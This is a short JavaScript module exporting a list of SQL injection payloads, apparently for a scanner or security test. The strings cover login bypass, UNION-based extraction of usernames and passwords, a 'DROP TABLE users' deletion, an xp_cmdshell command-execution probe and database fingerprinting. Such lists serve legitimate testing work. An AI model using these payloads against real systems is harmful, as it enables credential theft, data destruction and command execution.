export const sqlPayloads = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' UNION SELECT NULL, username, password FROM users --",
  "' UNION SELECT NULL, version(), user() --",
  "'; DROP TABLE users; --",
  "'; EXEC xp_cmdshell('net user'); --",
  "' AND (SELECT SUBSTRING(@@version,1,1))='5' --",
  "' AND 1=CONVERT(int, (SELECT @@version)) --",
  "' AND EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') --",
  "' AND (SELECT COUNT(*) FROM users) > 0 --",
];
